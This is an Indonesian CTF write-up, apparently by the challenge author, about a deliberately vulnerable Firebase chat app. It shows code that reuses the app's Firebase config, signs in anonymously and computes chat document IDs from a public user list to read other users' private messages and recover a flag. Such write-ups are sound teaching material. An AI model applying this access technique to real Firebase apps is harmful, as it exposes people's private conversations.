---
comments: true
---

Hai, sebelumnya aku berterima kasih sekali kepada admin dan seluruh teman2 SHL karena sudah mau mencoba aplikasi chat yang ta karuan ini.

Oke, langsung ke pembahasan.

Mari kita coba informasi terlebih dahulu dari challenge yg diberikan. Berikut info2 yang mungkin saja penting:
- Link <a href="https://level-windflower.glitch.me/">https://level-windflower.glitch.me</a>
- Link solver <a href="https://level-windflower.glitch.me/solver">https://level-windflower.glitch.me/solver</a>
- Maybe u found a secret message there
- Any signed-in user can access this document

Info setelah cek aplikasi:
- `<!-- pada tanggal 30 september, tikus sedang bicara rahasia nya -->`
- Aplikasi menggunakan Firebase

```html
<!-- The core Firebase JS SDK is always required and must be listed first -->
<script src="https://www.gstatic.com/firebasejs/6.6.2/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/6.6.2/firebase-auth.js"></script>
<script src="https://www.gstatic.com/firebasejs/6.6.2/firebase-firestore.js"></script>
```
- Menggunakan Javascript
- Info dari Wappalizer juga sama yaitu: databasenya Firebase, programmingnya NodeJs, frameworknya pakai Express.

Karena aplikasi ini pake javascript saja untuk mengolah tampilannya, mari kita cari pelajari cara kerja aplikasi melalui file javascriptnya.
link <a href="https://level-windflower.glitch.me/client.js">https://level-windflower.glitch.me/client.js</a>.

Berikut hasil pengamatannya:
- Authentikasi menggunakan firebase auth dengan Provider Email & Anonymous.
```javascript
var uiConfig = {
    signInSuccessUrl: 'https://level-windflower.glitch.me/',
    signInOptions: [
        firebase.auth.EmailAuthProvider.PROVIDER_ID,
        firebaseui.auth.AnonymousAuthProvider.PROVIDER_ID
    ],
    // Required to enable one-tap sign-up credential helper.
    credentialHelper: firebaseui.auth.CredentialHelper.GOOGLE_YOLO
};
// Initialize the FirebaseUI Widget using Firebase.
var ui = new firebaseui.auth.AuthUI(firebase.auth());
// The start method will wait until the DOM is loaded.
ui.start('#firebaseui-auth-container', uiConfig);
``` 
- Ketika proses authentikasi berhasil, mengambil dan menampilkan data user dan daftar user yang terdaftar.
```javascript
getUsers();
const getUsers = function() {
    fetch('https://level-windflower.glitch.me/api/users')
    .then(function(response) {
        if (!response.ok) {
            throw Error(response.statusText);
        }
        // Read the response as json.
        return response.json();
    })
    .then(function(users) {
        users.forEach(function(user) {
            const newListItem = document.createElement('li');
            const anchor = document.createElement('a');
            anchor.href = '#';
            anchor.onclick = function() {
                getChats(user.id, user.name);
            };
            anchor.innerHTML = user.name;
            newListItem.appendChild(anchor);

            document.getElementById('users').appendChild(newListItem);
        });
    })
    .catch(function(error) {
        console.log('Looks like there was a problem: \n', error);
    });
};
```
- Kita juga dapat mengetahui jika daftar user yang terdaftar diambil dari <a href="https://level-windflower.glitch.me/api/users">https://level-windflower.glitch.me/api/users</a>.
- Jika salah satu user diklik, maka data chat dengan user yang diklik diambil.
```javascript
anchor.onclick = function() {
    getChats(user.id, user.name);
};
```

Mungkin kegiatan ini lebih cocok untuk seorang developer, tapi temen2 pasti seorang yang suka belajar tentunya.
Nah kita masuk pada fungsi yang penting, mari coba pelajari fungsi getChats nya!

- Fungsi menerima 2 parameter yaitu `uid` dan `name`, `name` tipenya optional.
```javascript
const getChats = function(uid, name = "") {
```
- Diawal, fungsi mendefinisikan 3 variabel yaitu `db`, `user` dan `docIdChat`.
```javascript
const db = firebase.firestore();
const user = firebase.auth().currentUser;
const docIdChat = (user.uid > uid) ? uid + user.uid : user.uid + uid;
```
- Variabel `uid` yang diterima oleh fungsi itu value nya apa sih?, dapat kita tahu dari fungsi `getUsers` bahwa `uid` itu diambil dari `/api/users` yang value nya seperti ini `02f9LgFjghS0wdkv5OqSVP0Jju83`.
- Lanjut lagi ke fungsi, setelah definisi fungsi kemudian mengambil data dari collection `chats` yang data array `users` nya mengandung `user.uid`
```javascript
db.collection("chats").where("users", "array-contains", user.uid).get()
```
- `user.uid` ini sepertinya id dari user yang berhasil login dan mirip dengan `uid` tadi.
- Lanjut lagi, setelah mangambil data chat, data yang didapat tadi di loop dan ada pengecekan `if (doc.id == docIdChat) {`. Variabel `doc.id` isinya apa masih belum tahu namun untuk `docIdChat` bisa kita ketahui.
- Mari kita pahami `docIdChat`, variabel ini isinya terdiri dari gabungan 2 variabel yaitu `uid` & `user.uid` dan value yang terkecil berada didepan. Misal ada `abc` & `def` maka `docIdChat` nya `abcdef`.
- Jadi kita dapat kita asumsikan kan bahwa document id data yang ambil dari collection `chats` adalah gabungan dari 2 id user yang chat. Dan itu menjadi identitas dari setiap chat yang terjadi.

Bukti dari asumsi diatas adalah :

```html
<!-- kondisi form saat chat -->
<!-- dapat dilihat dengan inspect element -->
<form>
    <input type="hidden" id="to" name="to" value="1Crs8h43eKM61nHZ7IW9gWD76lI2">
    <input type="hidden" id="docId" name="doc_id" value="1Crs8h43eKM61nHZ7IW9gWD76lI2AklnM0ECqthXXM5EH7SthK1mR4E2">
    <textarea name="text" placeholder="message" width="100%"></textarea>
    <input type="submit" value="Send">
</form>
```
```javascript
// ditemukan juga pada saat mau mengirim pesan
let docId = document.getElementById('docId').value;
let newDocId = (chat.to > chat.from) ? chat.from + chat.to : chat.to + chat.from;
```

Dari asumsi ini seperti cukup untuk bisa mendapatkan isi chat milik orang lain, yaitu dengan melihat list data user dari /api/users, kemudian kita buat document id milik orang lain.

Nah, mari kita coba lakukan itu. Sebelumnya kita cari tahu bagaimana caranya? Dan seperti pake code ini, seperti yang didalam fungsi.
```javascript
db.collection("chats").doc(doc.id).collection("items").orderBy("createdAt")
    .onSnapshot(function(querySnapshot) {
```
Bagaimana ya agar kita bisa merubah `doc.id` sesuka hati ku? Em, aku coba buat file html sendiri saja, trus konfigurasi load firebase nya copy dari web ini.

Dan kurang lebih hasilnya seperti ini

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <title>Welcome to Glitch!</title>
    <meta name="description" content="A cool thing made with Glitch">
    <link id="favicon" rel="icon" href="https://glitch.com/edit/favicon-app.ico" type="image/x-icon">
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
</head>
<body>
<!-- The core Firebase JS SDK is always required and must be listed first -->
<script src="https://www.gstatic.com/firebasejs/6.6.2/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/6.6.2/firebase-auth.js"></script>
<script src="https://www.gstatic.com/firebasejs/6.6.2/firebase-firestore.js"></script>

<script>
// Your web app's Firebase configuration
var firebaseConfig = {
   apiKey: "AIzaSyABsBqC44u7MHNrL10h9e_CbRsR9t8ZH7k",
   authDomain: "fullstack-firebase-fdc9b.firebaseapp.com",
   databaseURL: "https://fullstack-firebase-fdc9b.firebaseio.com",
   projectId: "fullstack-firebase-fdc9b",
   storageBucket: "fullstack-firebase-fdc9b.appspot.com",
   messagingSenderId: "619860031954",
   appId: "1:619860031954:web:a6c3a267cec593f8"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);

let db = firebase.firestore();
let docId = '1Crs8h43eKM61nHZ7IW9gWD76lI2AklnM0ECqthXXM5EH7SthK1mR4E2';
db.collection("chats").doc(docId).collection("items")
.onSnapshot(function(querySnapshot) {
    querySnapshot.forEach(function(doc) {
        console.log(doc.data());
    });
});
</script>
</body>
```
Dan setelah aku coba jalankan, ternyata aku mendapatkan pesan error.
```
Uncaught Error in onSnapshot: FirebaseError: "Missing or insufficient permissions."
```

<a href="/assets/images/2019-10-03-214821_1363x237_scrot.png" target="_blank">
    <img src="/assets/images/2019-10-03-214821_1363x237_scrot.png" style='width:100%;' border="0" alt="percobaan pertama">
</a>

Emm, aku tahu ini kenapa? seperti karena aku belum melakukan sign in.
Bagaimana aku bisa melakukan sign in? 
Oke berdasarkan petunjuk disini <a href="https://firebase.google.com/docs/auth/web/anonymous-auth">https://firebase.google.com/docs/auth/web/anonymous-auth</a>, kita bisa menambahkan code ini.
```javascript
firebase.auth().signInAnonymously().catch(function(error) {
    // Handle Errors here.
    var errorCode = error.code;
    var errorMessage = error.message;
    // ...
});

```
Dan seperti pada file `client.js`, kita perlu tambahkan jadi seperti ini.
```javascript
firebase.auth().onAuthStateChanged(function(user) {
    if (user) {
        let db = firebase.firestore();
        let docId = '1Crs8h43eKM61nHZ7IW9gWD76lI2AklnM0ECqthXXM5EH7SthK1mR4E2';
        db.collection("chats").doc(docId).collection("items")
        .onSnapshot(function(querySnapshot) {
            querySnapshot.forEach(function(doc) {
                console.log(doc.data());
            });
        });
    }
    // ...
});
```
Dan yeyy, berhasil.
```
Object { createdAt: {…}, from: "AklnM0ECqthXXM5EH7SthK1mR4E2", text: "Hai" }
```
<a href="/assets/images/2019-10-03-221015_629x193_scrot.png" target="_blank">
    <img src="/assets/images/2019-10-03-221015_629x193_scrot.png" style='width:100%;' border="0" alt="percobaan kedua">
</a>

Oke teman2, masih lanjut lagi. 
Sekarang bagaimana cara kita menemukan pesan rahasia? 
Dari info yang kita dapat sebelumnya
```
<!-- pada tanggal 30 september, tikus sedang bicara rahasia nya -->
```

Yang berarti kemungkinan pesan rahasia itu terkirim pada tanggal 30 September dan yang mengirim adalah tikus.

Kita coba cari tikus ini pada `/api/users`!. Dan benar, kita menemukannya.
```json
{"id":"AklnM0ECqthXXM5EH7SthK1mR4E2","name":"Tikus","email":"anonymouse@tikus.com","createdAt":"Mon, 30 Sep 2019 15:19:50 GMT"}
```
Sekarang kita cari tahu dengan siapa si tikus ini berbicara? Kita hanya punya satu petunjuk yaitu pasti user itu tidak tercreate setelah 30 Sep bukan?.

Berarti kita coba filter users terlebih dahulu dari `api/users` yang daftar tidak lebih dari 30 Sep. Bagaimana caranya? Oke, kita cobasimpan sebagai json saja `api/users` nya dan nanti kita pakai fungsi javascript `fetch` dan array filter.

Kurang lebih code nya seperti ini.
```javascript
fetch('users.json')
.then(function(response) {
    if (!response.ok) {
        throw Error(response.statusText);
    }
    // Read the response as json.
    return response.json();
})
.then(function(users) {
    let validUsers = users.filter(function(user) {
        let createdAt = new Date(user.createdAt);
        let tiga_satu_september = new Date(2019, 8, 31);
        if (createdAt.getTime() < tiga_satu_september.getTime()) {
            return true;
        } 
        return false;
    });
})
.catch(function(error) {
    console.log('Looks like there was a problem: \n', error);
});
```
Nah setelah itu kita bisa deh buat document id nya dan nyari chat rahasinya.
Kurang lebih code nya jadi seperti ini.
```javascript
fetch('users.json')
.then(function(response) {
    if (!response.ok) {
        throw Error(response.statusText);
    }
    // Read the response as json.
    return response.json();
})
.then(function(users) {

    let validUsers = users.filter(function(user) {
        let createdAt = new Date(user.createdAt);
        let tiga_satu_september = new Date(2019, 8, 31);
        if (createdAt.getTime() < tiga_satu_september.getTime()) {
            return true;
        } 
        return false;
    });

    let db = firebase.firestore();
    validUsers.forEach(function(user) {
        var tikus = 'AklnM0ECqthXXM5EH7SthK1mR4E2';
        var docId = (user.id > tikus) ? tikus + user.id : user.id + tikus;

        db.collection("chats").doc(docId).collection("items")
        .onSnapshot(function(querySnapshot) {
            querySnapshot.forEach(function(doc) {
                console.log(doc.data());
            });
        });
    });
})
.catch(function(error) {
    console.log('Looks like there was a problem: \n', error);
});
```

Dan Alhamdulillah, kita sepertinya mendapatkannya.
```
Object { createdAt: {…}, from: "6TnSsggCYfV5oUSWgmscDPtLMcZ2", text: "nice, hai kawan" }
Object { createdAt: {…}, from: "AklnM0ECqthXXM5EH7SthK1mR4E2", text: "curl -H \"Content-Type: application/json\" -H \"X-Flag-Token: flag\" -X POST -d '{\"name\":\"your name\"}'" }
Object { createdAt: {…}, from: "AklnM0ECqthXXM5EH7SthK1mR4E2", text: "simpan itu" }
Object { createdAt: {…}, from: "6TnSsggCYfV5oUSWgmscDPtLMcZ2", text: "sepoi angin malam menyapa" }
Object { createdAt: {…}, from: "AklnM0ECqthXXM5EH7SthK1mR4E2", text: "tikus tikus liar mulai bekerja" }
Object { createdAt: {…}, from: "AklnM0ECqthXXM5EH7SthK1mR4E2", text: "Fl49{FrBs_Th4nk5_943ss5}" }
Object { createdAt: {…}, from: "qS0wR16CE8gMVQewTegF4TUQWbs2", text: "A" }
```
<a href="/assets/images/2019-10-03-232154_1364x363_scrot.png" target="_blank">
    <img src="/assets/images/2019-10-03-232154_1364x363_scrot.png" style='width:100%;' border="0" alt="percobaan kedua">
</a>

Dari hasil diatas kita dapatkan
```
Fl49{FrBs_Th4nk5_943ss5}
curl -H \"Content-Type: application/json\" -H \"X-Flag-Token: flag\" -X POST -d '{\"name\":\"your name\"}'
```

Sebelum kita sudah diberi tahu info link solver nya, mungkin command `curl` diatas di arahkan kesana. Oke mari kita coba.
```bash
$ curl -H "Content-Type: application/json" -H "X-Flag-Token: Fl49{FrBs_Th4nk5_943ss5}" -X POST -d '{"name":"uddin_mtm"}' https://level-windflower.glitch.me/solver
Document created%

```
Alhamdulillah selesai cerita ini. Hehehe

<a href="/assets/images/2019-10-03-233902_557x299_scrot.png" target="_blank">
    <img src="/assets/images/2019-10-03-233902_557x299_scrot.png" style='width:100%;' border="0" alt="percobaan kedua">
</a>

Terima kasih untuk semuanya, banyak ilmu yang telah saya dapat dari teman2 semua. Sehingga saya bisa buat seperti ini.

Kurang lebih nya mohon dimaafin ya! 
